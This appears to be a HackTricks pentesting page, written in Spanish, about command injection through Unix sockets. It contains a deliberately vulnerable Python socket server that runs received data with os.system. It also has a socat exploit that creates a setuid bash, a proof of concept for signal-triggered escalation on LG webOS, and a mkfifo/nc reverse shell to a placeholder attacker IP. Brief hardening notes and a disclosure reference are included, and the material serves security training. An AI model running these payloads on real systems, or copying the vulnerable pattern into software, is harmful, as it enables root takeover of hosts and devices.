# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

En el siguiente ejemplo se crea un **unix socket** (`/tmp/socket_test.s`) y todo lo que se **reciba** será **ejecutado** por `os.system`. Sé que no vas a encontrar esto en el mundo real, pero el objetivo de este ejemplo es ver cómo se ve un código que usa unix sockets y cómo manejar la entrada en el peor caso posible.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Ejecute** el código usando python: `python s.py` y **compruebe cómo está escuchando el socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Estudio de caso: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Algunos daemons privilegiados exponen un UNIX socket propiedad de root que acepta entrada no confiable y vincula acciones privilegiadas a thread-IDs y señales. Si el protocolo permite que un cliente no privilegiado influya en qué native thread es el objetivo, podrías ser capaz de activar una ruta de código privilegiado y escalar.

Patrón observado:
- Conectarse a un socket propiedad de root (p.ej., /tmp/remotelogger).
- Crear un thread y obtener su native thread id (TID).
- Enviar el TID (packed) más padding como petición; recibir un acknowledgement.
- Enviar una señal específica a ese TID para activar el comportamiento privilegiado.

Bosquejo mínimo de PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Para convertir esto en un root shell, se puede usar un patrón simple de named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notas:
- Esta clase de bugs surge de confiar en valores derivados del estado de cliente sin privilegios (TIDs) y de vincularlos a manejadores de señales o a lógica privilegiada.
- Endurecer forzando la verificación de credenciales en el socket, validando los formatos de mensaje y desacoplando las operaciones privilegiadas de los identificadores de hilo proporcionados externamente.

## Referencias

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
